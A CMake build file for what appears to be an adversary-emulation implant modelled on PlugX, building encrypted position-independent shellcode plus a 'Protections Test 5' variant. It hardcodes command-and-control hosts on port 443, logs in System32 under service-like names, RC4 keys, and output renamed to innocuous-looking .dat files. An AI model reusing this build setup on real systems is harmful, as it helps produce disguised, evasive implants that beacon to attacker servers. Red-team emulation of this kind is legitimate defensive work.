###############################################################################
# PLUG X SHELLCODE
###############################################################################

# Enable MASM
enable_language(ASM_MASM)

find_package(Python3 REQUIRED COMPONENTS Interpreter)

# Shellcode container
add_pic(
    shellcode
    entry.cpp
    shellcode.hpp
    ""
    "${CMAKE_SOURCE_DIR}/src/shellcode/registry/module_registry.cpp"
    comms.cpp
    shellcode_util.cpp
    "${CMAKE_SOURCE_DIR}/src/common/base64.cpp"
    "${CMAKE_SOURCE_DIR}/src/common/rc4.cpp"
    "${CMAKE_SOURCE_DIR}/src/common/util.cpp"

    # Logging functionality
    "${CMAKE_SOURCE_DIR}/src/common/logger.cpp"
    "${CMAKE_SOURCE_DIR}/src/common/pi_aes_ctr.cpp"
)

# Test 5 shellcode container
add_pic(
    test5shellcode
    entry.cpp
    test5shellcode.hpp
    ""
    "${CMAKE_SOURCE_DIR}/src/shellcode/registry/module_registry.cpp"
    comms.cpp
    shellcode_util.cpp
    "${CMAKE_SOURCE_DIR}/src/common/base64.cpp"
    "${CMAKE_SOURCE_DIR}/src/common/rc4.cpp"
    "${CMAKE_SOURCE_DIR}/src/common/util.cpp"

    # Logging functionality
    "${CMAKE_SOURCE_DIR}/src/common/logger.cpp"
    "${CMAKE_SOURCE_DIR}/src/common/pi_aes_ctr.cpp"
)

target_include_directories(
    shellcode-pe
    PUBLIC
    "${CMAKE_SOURCE_DIR}/src/common"
    "${CMAKE_SOURCE_DIR}/src/shellcode"
    "${CMAKE_SOURCE_DIR}/src/shellcode/registry"
)

# Auto-add all module subdirectories
file(GLOB MODULE_DIRS RELATIVE ${CMAKE_SOURCE_DIR}/src/shellcode/modules ${CMAKE_SOURCE_DIR}/src/shellcode/modules/*)
foreach(mod ${MODULE_DIRS})
    if(IS_DIRECTORY "${CMAKE_SOURCE_DIR}/src/shellcode/modules/${mod}")
        message("Adding module: ${mod}")
        add_subdirectory(${CMAKE_SOURCE_DIR}/src/shellcode/modules/${mod})
    endif()
endforeach()

target_compile_definitions(
    shellcode-pe
    PRIVATE
    SERVER="ValarMorghulis.org"
    PORT=443
    HTTPS=1
    SH_LOG_FILE="C:\\\\Windows\\\\System32\\\\wingupsvc.log"
    ENCRYPTED_LOGGING=1 # set to 0 to disable, set to non-0 to enable
)

set(CONFIG $<CONFIG>)
set(BIN_DIR "${CMAKE_CURRENT_BINARY_DIR}/${CONFIG}")

set(BIN_FILE "${BIN_DIR}/shellcode.bin")
set(ENCRYPTED_FILE "${BIN_DIR}/encrypted_shellcode.bin")
set(FINAL_FILE "${BIN_DIR}/WinGUpdate.dat")
set(ENCRYPT_SCRIPT "${CMAKE_SOURCE_DIR}/src/shellcode/external_helpers/rc4_encrypt_file.py")
set(KEY "B8p4Eh1n4TDDux0b")

# Post build
message(STATUS "Python Executable: ${Python3_EXECUTABLE}")
message(STATUS "Encrypt Script: ${ENCRYPT_SCRIPT}")
message(STATUS "Binary File: ${BIN_FILE}")

add_custom_command(
    OUTPUT ${FINAL_FILE}
    COMMAND ${CMAKE_COMMAND} -E echo "Renaming and encrypting binary"
    COMMAND ${Python3_EXECUTABLE} ${ENCRYPT_SCRIPT} ${BIN_FILE} ${KEY}
    COMMAND ${CMAKE_COMMAND} -E rename
        ${ENCRYPTED_FILE}
        ${FINAL_FILE}
    DEPENDS shellcode-pe ${ENCRYPT_SCRIPT}
    VERBATIM
)
message(STATUS "Binary File: ${BIN_FILE}")
add_custom_target(GenerateWinGUpdateDat ALL
    DEPENDS ${FINAL_FILE}
)


###############################################################################
# PROTECTIONS TEST 5 SHELLCODE
###############################################################################

target_include_directories(
    test5shellcode-pe
    PUBLIC
    "${CMAKE_SOURCE_DIR}/src/common"
    "${CMAKE_SOURCE_DIR}/src/shellcode"
    "${CMAKE_SOURCE_DIR}/src/shellcode/registry"
)

target_compile_definitions(
    test5shellcode-pe
    PRIVATE
    SERVER="MaesterJam2025.com"
    PORT=443
    HTTPS=1
    SH_LOG_FILE="C:\\\\Windows\\\\System32\\\\rcsvc.log"
    ENCRYPTED_LOGGING=1 # set to 0 to disable, set to non-0 to enable
)

set(TEST5_BIN_FILE "${BIN_DIR}/test5shellcode.bin")
set(TEST5_ENCRYPTED_FILE "${BIN_DIR}/encrypted_test5shellcode.bin")
set(TEST5_FINAL_FILE "${BIN_DIR}/resinfo.dat")
set(TEST5_KEY "pao2i3oq91KZmqps")

# Post build
message(STATUS "Python Executable: ${Python3_EXECUTABLE}")
message(STATUS "Encrypt Script: ${ENCRYPT_SCRIPT}")
message(STATUS "Test 5 Binary File: ${TEST5_BIN_FILE}")

add_custom_command(
    OUTPUT ${TEST5_FINAL_FILE}
    COMMAND ${CMAKE_COMMAND} -E echo "Renaming and encrypting test 5 shellcode"
    COMMAND ${Python3_EXECUTABLE} ${ENCRYPT_SCRIPT} ${TEST5_BIN_FILE} ${TEST5_KEY}
    COMMAND ${CMAKE_COMMAND} -E rename
        ${TEST5_ENCRYPTED_FILE}
        ${TEST5_FINAL_FILE}
    DEPENDS test5shellcode-pe ${ENCRYPT_SCRIPT}
    VERBATIM
)
message(STATUS "Test 5 shellcode file: ${TEST5_BIN_FILE}")
add_custom_target(GenerateResinfoDat ALL
    DEPENDS ${TEST5_FINAL_FILE}
)
